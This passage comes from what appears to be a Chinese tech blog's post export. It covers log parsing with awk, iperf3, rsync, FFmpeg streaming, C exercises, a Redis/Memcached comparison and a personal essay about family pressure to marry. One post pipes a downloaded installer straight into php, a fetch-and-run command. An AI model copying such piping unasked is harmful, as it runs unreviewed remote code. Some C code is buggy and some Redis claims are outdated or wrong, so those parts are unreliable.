log.log | awk &apos;{sum+=$9}END{sum}&apos;$9 是指日志文件的第九行 21672 [root@CTN-QD-247 wwwlogs]# cat awen.me-2017-02-23-access.log 43.230.89.164 - - [23/Feb/2017:12:16:32 +0800] &quot;GET / HTTP/1.1&quot; 200 13091 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot; 43.230.89.163 - - [23/Feb/2017:12:16:33 +0800] &quot;GET / HTTP/1.1&quot; 200 13091 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot; 43.230.89.163 - - [23/Feb/2017:12:16:37 +0800] &quot;GET / HTTP/1.1&quot; 200 13091 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot; [root@CTN-QD-247 wwwlogs]# awk &apos;{sum+=$10}END{print sum}&apos; awen.me-2017-02-23-access.log 39273","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://awen.me/tags/Linux/"}]},{"title":"父母的话能听吗？","slug":"父母的话能听吗？","date":"2017-02-18T23:34:43.000Z","updated":"2021-02-26T06:05:29.346Z","comments":true,"path":"posts/64082.html","link":"","permalink":"https://awen.me/posts/64082.html","excerpt":"昨天和我妈聊天，又催我结婚，但是这次她不是用她自己的口吻开说，而是用我姑姑的口吻来问我说:”你姑姑问你今年结婚不结婚”，我说不着急，今年才26，等2年也不迟的，现在先努力赚钱买个房，这话我对他们说过很多次了，还是一直催，我总觉得他们一点也不了解我，一点也不了解这个残酷的现实社会，经常怼我说没房子难道就不结婚了啊！先结婚后买房不行吗？","text":"昨天和我妈聊天，又催我结婚，但是这次她不是用她自己的口吻开说，而是用我姑姑的口吻来问我说:”你姑姑问你今年结婚不结婚”，我说不着急，今年才26，等2年也不迟的，现在先努力赚钱买个房，这话我对他们说过很多次了，还是一直催，我总觉得他们一点也不了解我，一点也不了解这个残酷的现实社会，经常怼我说没房子难道就不结婚了啊！先结婚后买房不行吗？ 呵呵，她们这套路我见多了，先催婚，如果听了他们的话，结了婚，那接下来就是催着要孩子了，生完一胎，接着就是催二胎。这套路，我可是身经百战了，见得多了，太图样图森破。 虽然说也26岁了，不能总是靠父母，我也一直这么认为的，自从毕业踏入社会，我几乎没有要求家里给过一分钱，除了14年我参加培训，找我爸借了1万块钱后来我也还他了，即使是亲身父母，我也觉得”拿人手短，吃人嘴短”,靠自己才是真本事，心里踏实，说话有底气。 我家在农村，父母都是农民，一年的收入来源，主要是种地(水稻、油菜)、采茶、然后我爸农闲就外出打工，我知道他们很辛苦，我也不奢求他们能帮到我什么，毕竟供我上完学已经很不容易了，家里也就最近几年条件稍微好转了点，前2年，爷爷和奶奶刚去世，奶奶在我上小学的时候就双目失明，我爷爷生了一个儿子，三个女儿（不知道为啥越穷越爱生），我爸最小，我爸说他小时候锅巴汤都没得喝，他也没得到我爷爷一点点的资源，更何况我爷爷是个刁钻的人，都不受村里人待见，本身也没什么资源，而且还时不时的给我爸妈找事。我爸妈完全靠自己打拼养活这一大家子，着实的辛苦。 两年前的春节，我爸问我是把老房子装修下还是重新盖个新房子，我当时就说现在盖房子也不便宜，人工材料等都很贵，而且乡下的房子不能升值的，把老房子重新刷下装修就好了，我以后打算买个房子，毕竟如果结婚以后要小孩，家里的自然环境虽然非常好，空气清新，但是教育资源都是城里不能比的，镇上就一幼儿园、一小学、一初中，师资如何？谁读谁知道咯！可他们不听，还是盖了3层楼，花了几十万。我也不好说什么了。说是给我和我弟的婚房，我一年回家也就最多呆上不到半个月时间，这个成本实在太高了，不过想想就当是他们自己给自己改善下居住环境吧。 城里的孩子每天下了课还可以参加各种兴趣班，补习班，交通也方便，除了收获知识，眼界也宽，更容易在未来快速的适应这个社会，而农村的孩子，各种缺资源，就拿我小时候说，很小的时候放学了就是玩泥巴，摸鱼，稍微长大点了放学放假就是帮父母干农活，放牛、采茶等等，这些东西根本不能帮助成长，从小到大，我几乎没看过一本课外书，学的东西都是课堂老师讲的那些东西，几十年生活在农村，看的少，见识少，等长大了还是要去城里谋生，毕竟这个社会的很大一部分资源、资本都是在城市里运作，等毕业了步入社会，发现一切都得从头开始。 就拿最简单的来说，选专业，父母自己都没念过什么书，而农村出来也是刚刚在县城念了2年多的书，见识也少，于是稀里糊涂的选个专业就上了，结果毕业发现这专业就是要死的节奏。学的东西根本毫无用武之地，找工作费劲千辛万苦，又得从头开始。这就不是说知识掌握的劳不劳的问题了，见识改变命运啊！ 父母要不是见识少，也不至于只守着一亩三分地一辈子啊！90年代我们村走出去的现在哪个不是都混的风生水起的。我爸总拿他没读过什么书来怼我，可是他不知道他的那些同龄人当时也没上过什么学，但是走出去之后，这情况就完全不一样了。 我妈还有我姑姑前几年还说，你找个工作好好干，努力干，干熟了老板就给你涨工资，不要经常换来换去，这里做几个月就换到那里，可是我毕业后的经历告诉我，适当的跳槽是有助于自己快速成长的哦，不是说一直呆一个单位干一辈子就能出任 CEO 赢取白富美，走向人生巅峰哦！看我毕业第一份工作干了2年，2000块钱的工作根本就没涨过。一直在消耗自己，没什么成长，但是当我走出来后发现我仅仅2年时间就翻了好几倍的工资。能力也大幅度提升。而且业余时间参加各种培训，对于工作得心应手。这又和我妈说的不一样了。时代变了，玩法也变了，只有跟上时代的步伐，才能不掉队，永远走在前面。 所以，这些活生生的例子摆在眼前，你说我会甘心找个媳妇生个孩子扔老家上学过一辈子，不。。。。可。。。。能！","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"利用iperf3 测试网络性能","slug":"利用iperf3-测试网络性能","date":"2017-02-17T05:19:00.000Z","updated":"2021-02-26T06:05:29.317Z","comments":true,"path":"posts/3207091047.html","link":"","permalink":"https://awen.me/posts/3207091047.html","excerpt":"安装yum -y install iperf3","text":"安装yum -y install iperf3 使用通用参数 -p, –port #，Server 端监听、Client 端连接的端口号；-f, –format [kmgKMG]，报告中所用的数据单位，Kbits, Mbits, KBytes, Mbytes；-i, –interval #，每次报告的间隔，单位为秒；-F, –file name，测试所用文件的文件名。如果使用在 Client 端，发送该文件用作测试；如果使用在 Server 端，则是将数据写入该文件，而不是丢弃；-A, –affinity n/n,m，设置 CPU 亲和力；-B, –bind ，绑定指定的网卡接口；-V, –verbose，运行时输出更多细节；-J, –json，运行时以 JSON 格式输出结果；–logfile f，输出到文件；-d, –debug，以 debug 模式输出结果；-v, –version，显示版本信息并退出；-h, –help，显示帮助信息并退出。 Server 端参数: -s, –server，以 Server 模式运行；-D, –daemon，在后台以守护进程运行；-I, –pidfile file，指定 pid 文件；-1, –one-off，只接受 1 次来自 Client 端的测试，然后退出。 Client 端参数-c, –client ，以 Client 模式运行，并指定 Server 端的地址；-u, –udp，以 UDP 协议进行测试；-b, –bandwidth #[KMG][/#]，限制测试带宽。UDP 默认为 1Mbit/秒，TCP 默认无限制；-t, –time #，以时间为测试结束条件进行测试，默认为 10 秒；-n, –bytes #[KMG]，以数据传输大小为测试结束条件进行测试；-k, –blockcount #[KMG]，以传输数据包数量为测试结束条件进行测试；-l, –len #[KMG]，读写缓冲区的长度，TCP 默认为 128K，UDP 默认为 8K；–cport ，指定 Client 端运行所使用的 TCP 或 UDP 端口，默认为临时端口；-P, –parallel #，测试数据流并发数量；-R, –reverse，反向模式运行（Server 端发送，Client 端接收）；-w, –window #[KMG]，设置套接字缓冲区大小，TCP 模式下为窗口大小；-C, –congestion ，设置 TCP 拥塞控制算法（仅支持 Linux 和 FreeBSD ）；-M, –set-mss #，设置 TCP/SCTP 最大分段长度（MSS，MTU 减 40 字节）；-N, –no-delay，设置 TCP/SCTP no delay，屏蔽 Nagle 算法；-4, –version4，仅使用 IPv4；-6, –version6，仅使用 IPv6；-S, –tos N，设置 IP 服务类型（TOS，Type Of Service）；-L, –flowlabel N，设置 IPv6 流标签（仅支持 Linux）；-Z, –zerocopy，使用 “zero copy”（零拷贝）方法发送数据；-O, –omit N，忽略前 n 秒的测试；-T, –title str，设置每行测试结果的前缀；–get-server-output，从 Server 端获取测试结果；–udp-counters-64bit，在 UDP 测试包中使用 64 位计数器（防止计数器溢出）。 案例1.启动服务端 # iperf3 -s2.然后在客户端运行 iperf –c 192.168.3.58 –w 100M –t 120 –i 10得到结果1.服务端 2.客户端 3.并发测试 1) 服务端 iperf3 -s -p 5001 -i 22） 客户端 iperf3 -c 192.168.10.161 -P 100 -t 30 -i 2 -l 10240 -p 5001 -c 指定服务端 IP -P 并发数，线程数 -t 30秒结束 -i 2秒输出一次 -l 指定传输的数据大小 -p 指定服务端端口 结果如图所示 [ ID] Interval Transfer Bandwidth [ 5] 0.00-30.06 sec 0.00 Bytes 0.00 bits/sec sender [ 5] 0.00-30.06 sec 37.6 MBytes 10.5 Mbits/sec receiver [ 7] 0.00-30.06 sec 0.00 Bytes 0.00 bits/sec sender [ 7] 0.00-30.06 sec 45.6 MBytes 12.7 Mbits/sec receiver [ 9] 0.00-30.06 sec 0.00 Bytes 0.00 bits/sec sender [ 9] 0.00-30.06 sec 31.9 MBytes 8.89 Mbits/sec receiver [ 11] 0.00-30.06 sec 0.00 Bytes 0.00 bits/sec sender [203] 0.00-30.06 sec 31.7 MBytes 8.84 Mbits/sec receiver [SUM] 0.00-30.06 sec 0.00 Bytes 0.00 bits/sec sender [SUM] 0.00-30.06 sec 3.51 GBytes 1.00 Gbits/sec receiver其中: 第一列对应的是-i 参数 2秒输出一次 第二列是传输时间，对应的是-t 30这个参数 第三列是流量 第四列是带宽 SUM 是发送和接收的带宽和流量汇总 [SUM] 0.00-30.06 sec 0.00 Bytes 0.00 bits/sec sender [SUM] 0.00-30.06 sec 3.51 GBytes 1.00 Gbits/sec receiver","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://awen.me/tags/Linux/"}]},{"title":"安装composer","slug":"安装composer","date":"2017-02-16T06:51:00.000Z","updated":"2021-02-26T06:05:29.331Z","comments":true,"path":"posts/1075851203.html","link":"","permalink":"https://awen.me/posts/1075851203.html","excerpt":"","text":"使用curl -sS https://getcomposer.org/installer | php mv composer.phar /usr/local/bin/composer composer require upyun/sdkcomposr 用法 点击传送","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://awen.me/tags/php/"}]},{"title":"C语言习题","slug":"C语言习题","date":"2017-02-11T02:41:28.000Z","updated":"2021-02-26T06:05:29.244Z","comments":true,"path":"posts/375795936.html","link":"","permalink":"https://awen.me/posts/375795936.html","excerpt":"","text":"逆序的三位数题目内容：程序每次读入一个正三位数，然后输出逆序的数字。注意，当输入的数字含有结尾的0时，输出不应带有前导的0。比如输入700，输出应该是7。 提示：对一个三位数数x，做x%10可以得到它的个位数，做x/100可以得到它的百位数，十位数则通过/和%两个运算的结合可以得到。 输入格式:你的程序每次读到一个3位的正整数。 输出格式：输出逆序的数。 输入样例：163 输出样例：361时间限制：500ms内存限制：32000kb ##代码 #include &lt;stdio.h&gt; int main() { int x,a,b,c; scanf(&quot;%d&quot;,&amp;x); if(x &lt;100 || x &gt; 999) { printf(&quot;您输入的值不是三位数\\n&quot;); } else { //提示：对一个三位数数x，做x%10可以得到它的个位数，做x/100可以得到它的百位数，十位数则通过/和%两个运算的结合可以得到。 a=x/100; // 取出百位数 b=x/10%10; // 得到十位数 c=x%10;//取出个位数 x=c*100+b*10+a; printf(&quot;%d&quot;,x); } return 0; }#时间换算 题目内容：UTC是世界协调时，BJT是北京时间，UTC时间相当于BJT减去8。现在，你的程序要读入一个整数，表示BJT的时和分。整数的个位和十位表示分，百位和千位表示小时。如果小时小于10，则没有千位部分；如果小时是0，则没有百位部分；如果小时不是0而分小于10分，需要保留十位上的0；如果小时是0而分小于10分的，则不需要保留十位上的0。如1124表示11点24分，而905表示9点5分，36表示0点36分，7表示0点7分。 有效的输入范围是0到2359，即你的程序不可能从测试服务器读到0到2359以外的输入数据。你的程序要输出这个时间对应的UTC时间，输出的格式和输入的相同，即输出一个整数，表示UTC的时和分。整数的个位和十位表示分，百位和千位表示小时。如果小时小于10，则没有千位部分；如果小时是0，则没有百位部分；如果小时不是0而分小于10分，需要保留十位上的0；如果小时是0而分小于10分的，则不需要保留十位上的0。 提醒：要小心跨日的换算。 输入格式:一个整数，表示BJT的时和分。整数的个位和十位表示分，百位和千位表示小时。如果小时小于10，则没有千位部分；如果小时是0，则没有百位部分；如果小时不是0而分小于10分，需要保留十位上的0；如果小时是0而分小于10分的，则不需要保留十位上的0。 输出格式：一个整数，表示UTC的时和分。整数的个位和十位表示分，百位和千位表示小时。如果小时小于10，则没有千位部分；如果小时是0，则没有百位部分；如果小时不是0而分小于10分，需要保留十位上的0；如果小时是0而分小于10分的，则不需要保留十位上的0。 输入样例：803 输出样例：3时间限制：500ms内存限制：32000kb 代码#include &lt;stdio.h&gt; int main() { int date; scanf(&quot;%d&quot;,&amp;date); if ((date&gt;0)&amp;&amp;(date&lt;2400)) { int hour=date/100; int min=date%100; hour=hour-8; if (hour&lt;0) { hour=hour+24; } printf(&quot;%d&quot;,hour*100+min); return 0; } else { printf(&quot; 值应在0~2359之间\\n&quot;); } }奇偶个数题目内容：你的程序要读入一系列正整数数据，输入-1表示输入结束，-1本身不是输入的数据。程序输出读到的数据中的奇数和偶数的个数。 输入格式:一系列正整数，整数的范围是（0,100000）。如果输入-1则表示输入结束。 输出格式：两个整数，第一个整数表示读入数据中的奇数的个数，第二个整数表示读入数据中的偶数的个数。两个整数之间以空格分隔。 输入样例：9 3 4 2 5 7 -1 输出样例：4 2 时间限制：500ms内存限制：32000kb 代码","categories":[],"tags":[]},{"title":"rsync命令","slug":"rsync命令","date":"2017-01-30T07:15:57.000Z","updated":"2021-02-26T06:05:29.291Z","comments":true,"path":"posts/38260.html","link":"","permalink":"https://awen.me/posts/38260.html","excerpt":"","text":"安装yum -y install rsync使用1.同步文件到远程服务器 [test@aliyun ~]$ rsync -avz nginx-1.13.8.tar.gz root@59.111.52.225:~/ sending incremental file list nginx-1.13.8.tar.gz sent 992668 bytes received 31 bytes 661799.33 bytes/sec total size is 992237 speedup is 1.002.使用 SSH 的方式同步，并排除一些文件 [test@aliyun ~]$ rsync -av -e ssh --exclude=&apos;*.new&apos; ~/nginx-1.13.8.tar.gz root@59.111.52.225:/opt sending incremental file list nginx-1.13.8.tar.gz sent 992457 bytes received 31 bytes 1984976.00 bytes/sec total size is 992237 speedup is 1.00参数-v, --verbose 详细模式输出。 -q, --quiet 精简输出模式。 -c, --checksum 打开校验开关，强制对文件传输进行校验。 -a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。 -r, --recursive 对子目录以递归模式处理。 -R, --relative 使用相对路径信息。 -b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。 --backup-dir 将备份文件(如~filename)存放在在目录下。 -suffix=SUFFIX 定义备份文件前缀。 -u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。 -l, --links 保留软链结。 -L, --copy-links 想对待常规文件一样处理软链结。 --copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。 --safe-links 忽略指向SRC路径目录树以外的链结。 -H, --hard-links 保留硬链结。 -p, --perms 保持文件权限。 -o, --owner 保持文件属主信息。 -g, --group 保持文件属组信息。 -D, --devices 保持设备文件信息。 -t, --times 保持文件时间信息。 -S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。 -n, --dry-run现实哪些文件将被传输。 -w, --whole-file 拷贝文件，不进行增量检测。 -x, --one-file-system 不要跨越文件系统边界。 -B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节。 -e, --rsh=command 指定使用rsh、ssh方式进行数据同步。 --rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。 -C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。 --existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。 --delete 删除那些DST中SRC没有的文件。 --delete-excluded 同样删除接收端那些被该选项指定排除的文件。 --delete-after 传输结束以后再删除。 --ignore-errors 及时出现IO错误也进行删除。 --max-delete=NUM 最多删除NUM个文件。 --partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。 --force 强制删除目录，即使不为空。 --numeric-ids 不将数字的用户和组id匹配为用户名和组名。 --timeout=time ip超时时间，单位为秒。 -I, --ignore-times 不跳过那些有同样的时间和长度的文件。 --size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。 --modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。 -T --temp-dir=DIR 在DIR中创建临时文件。 --compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。 -P 等同于 --partial。 --progress 显示备份过程。 -z, --compress 对备份的文件在传输时进行压缩处理。 --exclude=PATTERN 指定排除不需要传输的文件模式。 --include=PATTERN 指定不排除而需要传输的文件模式。 --exclude-from=FILE 排除FILE中指定模式的文件。 --include-from=FILE 不排除FILE指定模式匹配的文件。 --version 打印版本信息。 --address 绑定到特定的地址。 --config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。 --port=PORT 指定其他的rsync服务端口。 --blocking-io 对远程shell使用阻塞IO。 -stats 给出某些文件的传输状态。 --progress 在传输时现实传输过程。 --log-format=formAT 指定日志文件格式。 --password-file=FILE 从FILE中得到密码。 --bwlimit=KBPS 限制I/O带宽，KBytes per second。 -h, --help 显示帮助信息。配置文件vi /etc/xinetd.d/rsync #default: off # description: The rsync server is a good addition to an ftp server, as it \\ # allows crc checksumming etc. service rsync { disable = no socket_type = stream wait = no user = root server = /usr/bin/rsync server_args = --daemon log_on_failure += USERID }配置文件 vi /etc/rsyncd.conf uid=root gid=root max connections=4 log file=/var/log/rsyncd.log pid file=/var/run/rsyncd.pid lock file=/var/run/rsyncd.lock secrets file=/etc/rsyncd.passwd hosts deny=172.16.78.0/22 [www] comment= backup web path=/www read only = no exclude=test auth users=work","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"使用 FFmpeg 和 ffplay 推拉流","slug":"使用-FFmpeg-和-ffplay-推拉流","date":"2017-01-19T08:16:00.000Z","updated":"2021-02-26T06:05:29.303Z","comments":true,"path":"posts/1548761157.html","link":"","permalink":"https://awen.me/posts/1548761157.html","excerpt":"推流➜ Downloads ffmpeg -re -i Big\\ Buck\\ Bunny-YE7VzlLtp-4.mp4 -vcodec copy -f flv rtmp://uplive.v0.v5linux.com/live/lol ffmpeg version 3.2-tessus Copyright (c) 2000-2016 the FFmpeg developers built with Apple LLVM version 8.0.0 (clang-800.0.38) configuration: --cc=/usr/bin/clang --prefix=/opt/ffmpeg --extra-version=tessus --enable-avisynth --enable-fontconfig --enable-gpl --enable-libass --enable-libbluray --enable-libfreetype --enable-libgsm --enable-libmodplug --enable-libmp3lame --enable-libopencore-amrnb --enable-libopencore-amrwb --enable-libopus --enable-libschroedinger --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libtheora --enable-libvidstab --enable-libvo-amrwbenc --enable-libvorbis --enable-libvpx --enable-libwavpack --enable-libx264 --enable-libx265 --enable-libxavs --enable-libxvid --enable-libzmq --enable-version3 --disable-ffplay --disable-indev=qtkit --disable-indev=x11grab_xcb","text":"推流➜ Downloads ffmpeg -re -i Big\\ Buck\\ Bunny-YE7VzlLtp-4.mp4 -vcodec copy -f flv rtmp://uplive.v0.v5linux.com/live/lol ffmpeg version 3.2-tessus Copyright (c) 2000-2016 the FFmpeg developers built with Apple LLVM version 8.0.0 (clang-800.0.38) configuration: --cc=/usr/bin/clang --prefix=/opt/ffmpeg --extra-version=tessus --enable-avisynth --enable-fontconfig --enable-gpl --enable-libass --enable-libbluray --enable-libfreetype --enable-libgsm --enable-libmodplug --enable-libmp3lame --enable-libopencore-amrnb --enable-libopencore-amrwb --enable-libopus --enable-libschroedinger --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libtheora --enable-libvidstab --enable-libvo-amrwbenc --enable-libvorbis --enable-libvpx --enable-libwavpack --enable-libx264 --enable-libx265 --enable-libxavs --enable-libxvid --enable-libzmq --enable-version3 --disable-ffplay --disable-indev=qtkit --disable-indev=x11grab_xcb libavutil 55. 34.100 / 55. 34.100 libavcodec 57. 64.100 / 57. 64.100 libavformat 57. 56.100 / 57. 56.100 libavdevice 57. 1.100 / 57. 1.100 libavfilter 6. 65.100 / 6. 65.100 libswscale 4. 2.100 / 4. 2.100 libswresample 2. 3.100 / 2. 3.100 libpostproc 54. 1.100 / 54. 1.100 Input #0, mov,mp4,m4a,3gp,3g2,mj2, from &apos;Big Buck Bunny-YE7VzlLtp-4.mp4&apos;: Metadata: major_brand : isom minor_version : 512 compatible_brands: isomiso2avc1mp41 encoder : Lavf57.56.100 Duration: 00:09:56.57, start: 0.000000, bitrate: 1443 kb/s Stream #0:0(und): Video: h264 (Main) (avc1 / 0x31637661), yuv420p, 1280x720 [SAR 1:1 DAR 16:9], 1312 kb/s, 24 fps, 24 tbr, 90k tbn, 48 tbc (default) Metadata: handler_name : VideoHandler Stream #0:1(und): Audio: aac (LC) (mp4a / 0x6134706D), 44100 Hz, stereo, fltp, 125 kb/s (default) Metadata: handler_name : SoundHandler Output #0, flv, to &apos;rtmp://test.v0.v5linux.com/live/lol&apos;: Metadata: major_brand : isom minor_version : 512 compatible_brands: isomiso2avc1mp41 encoder : Lavf57.56.100 Stream #0:0(und): Video: h264 (Main) ([7][0][0][0] / 0x0007), yuv420p, 1280x720 [SAR 1:1 DAR 16:9], q=2-31, 1312 kb/s, 24 fps, 24 tbr, 1k tbn, 90k tbc (default) Metadata: handler_name : VideoHandler Stream #0:1(und): Audio: mp3 (libmp3lame) ([2][0][0][0] / 0x0002), 44100 Hz, stereo, fltp (default) Metadata: handler_name : SoundHandler encoder : Lavc57.64.100 libmp3lame Stream mapping: Stream #0:0 -&gt; #0:0 (copy) Stream #0:1 -&gt; #0:1 (aac (native) -&gt; mp3 (libmp3lame)) Press [q] to stop, [?] for help frame= 502 fps= 24 q=-1.0 Lsize= 4094kB time=00:00:20.87 bitrate=1606.7kbits/s speed= 1x拉流➜ ~ ffplay rtmp://uplive.b0.v5linux.com/live/lol ffplay version 3.2-tessus Copyright (c) 2003-2016 the FFmpeg developers built with Apple LLVM version 8.0.0 (clang-800.0.38) configuration: --cc=/usr/bin/clang --prefix=/opt/ffmpeg --extra-version=tessus --enable-avisynth --enable-fontconfig --enable-gpl --enable-libass --enable-libbluray --enable-libfreetype --enable-libgsm --enable-libmodplug --enable-libmp3lame --enable-libopencore-amrnb --enable-libopencore-amrwb --enable-libopus --enable-libschroedinger --enable-libsnappy --enable-libsoxr --enable-libspeex --enable-libtheora --enable-libvidstab --enable-libvo-amrwbenc --enable-libvorbis --enable-libvpx --enable-libwavpack --enable-libx264 --enable-libx265 --enable-libxavs --enable-libxvid --enable-libzmq --enable-version3 --enable-librtmp --enable-ffplay --enable-sdl2 --disable-ffmpeg --disable-ffprobe --disable-ffserver --disable-indev=qtkit --disable-indev=x11grab_xcb libavutil 55. 34.100 / 55. 34.100 libavcodec 57. 64.100 / 57. 64.100 libavformat 57. 56.100 / 57. 56.100 libavdevice 57. 1.100 / 57. 1.100 libavfilter 6. 65.100 / 6. 65.100 libswscale 4. 2.100 / 4. 2.100 libswresample 2. 3.100 / 2. 3.100 libpostproc 54. 1.100 / 54. 1.100 Metadata: : 0.000 fd= 0 aq= 0KB vq= 0KB sq= 0B f=0/0 width 1280.00 height 720.00 videodatarate 1282.04 framerate 24.00 videocodecid 7.00 audiodatarate 0.00 audiosamplerate 44100.00 audiosamplesize 16.00 stereo TRUE audiocodecid 2.00 major_brand isom minor_version 512 compatible_brands isomiso2avc1mp41 encoder Lavf57.56.100 server UPYUN/4.0.169(BMS) srs_primary UPYUN/4.0release srs_authors Chnvideo server_version 4.0.169 srs_pid 1120781.00 srs_id 429208.00 srs_server_ip 183.158.35.6 [flv @ 0x7f852207de00] audio stream discovered after head already parsed [flv @ 0x7f852207de00] video stream discovered after head already parsed Input #0, flv, from &apos;rtmp://test.b0.v5linux.com/live/lol&apos;:B f=0/0 Metadata: major_brand : isom minor_version : 512 compatible_brands: isomiso2avc1mp41 encoder : Lavf57.56.100 server : UPYUN/4.0.169(BMS) srs_primary : UPYUN/4.0release srs_authors : Chnvideo server_version : 4.0.169 srs_pid : 1120781 srs_id : 429208 srs_server_ip : 183.158.35.6 Duration: N/A, start: 0.014000, bitrate: N/A Stream #0:0: Audio: mp3, 44100 Hz, stereo, s16p, 128 kb/s Stream #0:1: Video: h264 (Main), yuv420p(progressive), 1280x720 [SAR 1:1 DAR 16:9], 24.42 fps, 24 tbr, 1k tbn, 48 tbc","categories":[],"tags":[{"name":"直播","slug":"直播","permalink":"https://awen.me/tags/%E7%9B%B4%E6%92%AD/"}]},{"title":"Redis 和 Memcached 的区别","slug":"Redis-和-Memcached-的区别","date":"2017-01-11T04:49:07.000Z","updated":"2021-02-26T06:05:29.264Z","comments":true,"path":"posts/14254.html","link":"","permalink":"https://awen.me/posts/14254.html","excerpt":"Redis 和 Memcached 都是使用内存存储数据，并且都是存储键值对，但是 redis 和 memcached 的区别其实还是很大的，这两个产品各有优势，没有谁就牛逼一点的说法，主要还是看使用场景吧！ 下面从几点聊一下这两者的区别：","text":"Redis 和 Memcached 都是使用内存存储数据，并且都是存储键值对，但是 redis 和 memcached 的区别其实还是很大的，这两个产品各有优势，没有谁就牛逼一点的说法，主要还是看使用场景吧！ 下面从几点聊一下这两者的区别： 数据类型支持memcached 使用 key-value 的形式存储和访问数据，其在内存中维护一张 hash 表，这使其对数据查询方面耗时降低了O(1)，保证了对数据的高可用访问。 而 redis 除了提供key-value，还提供了 list、hash、set、zset等数据类型的支持。 网络I/0模型不同memcached是多线程，非阻塞IO复用的网络模型，分为监听主线程和worker子线程，监听线程监听网络连接，接受请求后，将连接描述字pipe传递给worker线程，进行读写IO，网络层使用libevent封装的事件库，多线程模型可以发挥多核作用，但是引入了cache coherency和锁的问题，比如：memcached最常用的stats命令，实际memcached所有操作都要对这个全局变量加锁，进行技术等工作，带来了性能损耗。 redis使用单线程的IO复用模型，自己封装了一个简单的AeEvent事件处理框架，主要实现了epoll, kqueue和select，对于单存只有IO操作来说，单线程可以将速度优势发挥到最大，但是redis也提供了一些简单的计算功能，比如排序、聚合等，对于这些操作，单线程模型施加会严重影响整体吞吐量，CPU计算过程中，整个IO调度都是被阻塞的。 内存管理机制对于像Redis和Memcached这种基于内存的数据库系统来说，内存管理的效率高低是影响系统性能的关键因素。 Memcached默认使用Slab Allocation机制管理内存，其主要思想是按照预先规定的大小，将分配的内存分割成特定长度的块以存储相应长度的key-value数据记录，以完全解决内存碎片问题。 Memcached使用预分配的内存池的方式，使用slab和大小不同的chunk来管理内存，Item根据大小选择合适的chunk存储，内存池的方式可以省去申请/释放内存的开销，并且能减小内存碎片产生，但这种方式也会带来一定程度上的空间浪费，并且在内存仍然有很大空间时，新的数据也可能会被剔除. Redis的内存管理主要通过源码中zmalloc.h和zmalloc.c两个文件来实现的。Redis为了方便内存的管理，在分配一块内存之后，会将这块内存的大小存入内存块的头部。 在Redis中，并不是所有的数据都一直存储在内存中的。这是和Memcached相比一个最大的区别。当物理内存用完时，Redis可以将一些很久没用到的value交换到磁盘。Redis只会缓存所有的key的信息，如果Redis发现内存的使用量超过了某一个阀值，将触发swap的操作，Redis根据“swappability = age*log(size_in_memory)”计算出哪些key对应的value需要swap到磁盘。然后再将这些key对应的value持久化到磁盘中，同时在内存中清除。这种特性使得Redis可以保持超过其机器本身内存大小的数据。 数据存储及持久化memcached不支持内存数据的持久化操作，所有的数据都以in-memory的形式存储。 redis支持持久化操作。redis提供了两种不同的持久化方法来讲数据存储到硬盘里面，一种是快照（snapshotting)，它可以将存在于某一时刻的所有数据都写入硬盘里面。另一种方法叫只追加文件（append-only file， AOF),它会在执行写命令时，将被执行的写命令复制到硬盘里面。 数据一致性问题Memcached提供了cas命令，可以保证多个并发访问操作同一份数据的一致性问题。 Redis没有提供cas 命令，并不能保证这点，不过Redis提供了事务的功能，可以保证一串 命令的原子性，中间不会被任何操作打断。 集群管理不同Memcached是全内存的数据缓冲系统，Redis虽然支持数据的持久化，但是全内存毕竟才是其高性能的本质。作为基于内存的存储系统来说，机器物理内存的大小就是系统能够容纳的最大数据量。如果需要处理的数据量超过了单台机器的物理内存大小，就需要构建分布式集群来扩展存储能力。 Memcached本身并不支持分布式，因此只能在客户端通过像一致性哈希这样的分布式算法来实现Memcached的分布式存储。下图给出了Memcached的分布式存储实现架构。当客户端向Memcached集群发送数据之前，首先会通过内置的分布式算法计算出该条数据的目标节点，然后数据会直接发送到该节点上存储。但客户端查询数据时，同样要计算出查询数据所在的节点，然后直接向该节点发送查询请求以获取数据。 相较于Memcached只能采用客户端实现分布式存储，Redis更偏向于在服务器端构建分布式存储。最新版本的Redis已经支持了分布式存储功能。Redis Cluster是一个实现了分布式且允许单点故障的Redis高级版本，它没有中心节点，具有线性可伸缩的功能。Redis Cluster的分布式存储架构，节点与节点之间通过二进制协议进行通信，节点与客户端之间通过ascii协议进行通信。在数据的放置策略上，Redis Cluster将整个key的数值域分成4096个哈希槽，每个节点上可以存储一个或多个哈希槽，也就是说当前Redis Cluster支持的最大节点数就是4096。Redis Cluster使用的分布式算法也很简单：crc16( key ) % HASH_SLOTS_NUMBER。 